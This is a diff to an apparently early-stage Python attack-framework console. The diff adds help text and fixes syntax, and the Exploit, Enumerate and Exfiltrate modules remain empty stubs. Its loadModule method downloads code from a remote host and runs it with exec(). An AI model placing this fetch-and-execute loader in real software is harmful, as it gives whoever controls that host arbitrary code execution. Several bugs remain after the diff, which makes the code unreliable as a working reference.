@@ -8,11 +8,11 @@ class Terminal:
         self.remote_host = remote_host
         self.default_modules = [] # add default modules to be loaded here
         self.loaded_modules = {}
-        for module in self.defaultModules:
+        for module in self.default_modules:
             loadModule(module)
         self.current_module = None
         self.motd = motd
-        motd()
+        self.showMotd()
     
     def showMotd(self):
         """ print motd banner """
@@ -32,11 +32,11 @@ class Terminal:
         cmd = cmd.strip().split(' ')
         if cmd[0] == "help":
             # Display help
-            self.help
-        elif: cmd[0] == "motd":
+            self.help()
+        elif cmd[0] == "motd":
             # Print banner
             self.showMotd()
-        elif: cmd[0] == "quit":
+        elif cmd[0] == "quit":
             # Exit to command line
             self.quit()
         elif cmd[0] == "load" and 1 < len(cmd) <= 3:
@@ -57,7 +57,7 @@ class Terminal:
         elif cmd[0] == "run":
             # Run the module
             self.runModule()
-        elif cmd[0] == "exter" and 1 < len(cmd) <= 4:
+        elif cmd[0] == "extern" and 1 < len(cmd) <= 4:
             if len(cmd) == 2:
                 self.runExteranl(cmd[1])
             elif len(cmd) == 3:
@@ -69,11 +69,23 @@ class Terminal:
 
     def help(self):
         """ Print help information """
-        print(" I am yet to write any help message so you'll just have to brute force this baby!")
+        print("----------Commands----------")
+        print("load [module-name] <remote host>- Downloads a module from the remote host and makes it available to be used")
+        print("set module [module-name] - Makes the specified module active")
+        print("set remote [host ip address] - Sets the ip address of the default remote host to download resources from")
+        print("set attr [attribute-name] [attribute-value] - Sets an attribute of the current module a specified value")
+        print("run - Executes the primary function of the module")
+        print("extern [filename] <remote-host>")
+        print("help - Prints this very message to the console")
+        print("motd - Displays the message of the day banner")
+        print("quit - Exits the program")
     
-    def loadModule(self, module, host=self.remote_host):
+    def loadModule(self, module, host=None):
         """ Connects back to the remote host and attempts to download and import the specified module"""
-        raw = requests.get(host+"/modules/"moudle).text
+        if not host:
+            host = self.remote_host
+        print(f'[*] Loading module {module} from {host}')
+        raw = requests.get(host+"/modules/"+module).text
         exec(raw)
 
     def isValidIpAddr(self, addr):
@@ -116,8 +128,10 @@ class Terminal:
         #print("")
         exit(0)
 
-    def runExternal(self, resource, host=self.remote_host, foreground=True):
+    def runExternal(self, resource, host=None, foreground=True):
         """ Create an instance of external class to handle script, create a new thread to do so if fg set """
+        if not host:
+            host = self.remote_host
         print("[*] Loading external script from http://"+host+"/"+resource)
         session = External(resocure, host, foreground)
         result = session.begin()
@@ -130,8 +144,8 @@ class External:
     def __init__(self, resource, host, foreground):
         self.fg = foreground
 
-    def begin()
-        pass:
+    def begin():
+        pass
 
 class BaseModule:
     def __init__(self):
@@ -156,6 +170,7 @@ class BaseModule:
 
 
 # Children of Base Module
+# Probably 100% useless
 
 class Exploit(BaseModule):
     def __init__(self):
@@ -165,6 +180,10 @@ class Enumate(BaseModule):
     def __init__(self):
         pass
 
-class Exfiltrate(BaseMoudle):
+class Exfiltrate(BaseModule):
     def __init__(self):
         pass
+
+if __name__ == "__main__":
+    term = Terminal("127.0.0.1")
+    term.commandLine()
